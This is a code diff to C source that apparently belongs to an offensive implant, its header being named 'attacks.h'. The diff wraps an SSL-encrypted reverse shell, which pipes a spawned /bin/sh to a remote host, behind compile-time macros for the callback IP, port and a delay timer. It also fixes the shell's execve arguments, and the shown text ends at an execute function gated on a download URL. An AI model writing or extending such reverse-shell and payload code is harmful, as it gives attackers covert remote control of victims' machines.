@@ -8,10 +8,12 @@
 #include <sys/wait.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <sys/stat.h>
 
 #include "../include/attacks.h"
 #include "../include/utils.h"
 
+#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
 static SSL_CTX *create_context(const SSL_METHOD *method) {
     SSL_CTX *ctx;
 
@@ -26,8 +28,8 @@ static SSL_CTX *create_context(const SSL_METHOD *method) {
 }
 
 static void handle_shell(SSL *ssl) {
+
     int p;
-    int bytes;
     int serv_shell[2];
     int shell_serv[2];
     char buf[1024];
@@ -47,7 +49,8 @@ static void handle_shell(SSL *ssl) {
             dup2(shell_serv[1], STDERR_FILENO);
             close(serv_shell[1]);
             close(shell_serv[0]);
-            execve("/bin/sh", NULL, NULL);
+            char* argv[] = {"/bin/sh", NULL};
+            execve("/bin/sh", argv, NULL);
             LOG("execve failed\n");
             close(serv_shell[0]);
             close(shell_serv[1]);
@@ -107,6 +110,7 @@ static void handle_shell(SSL *ssl) {
     close(serv_shell[1]);
     close(shell_serv[0]);
 }
+#endif
 
 static int execute(char *file_path) {
 #ifdef DOWNLOAD_URL
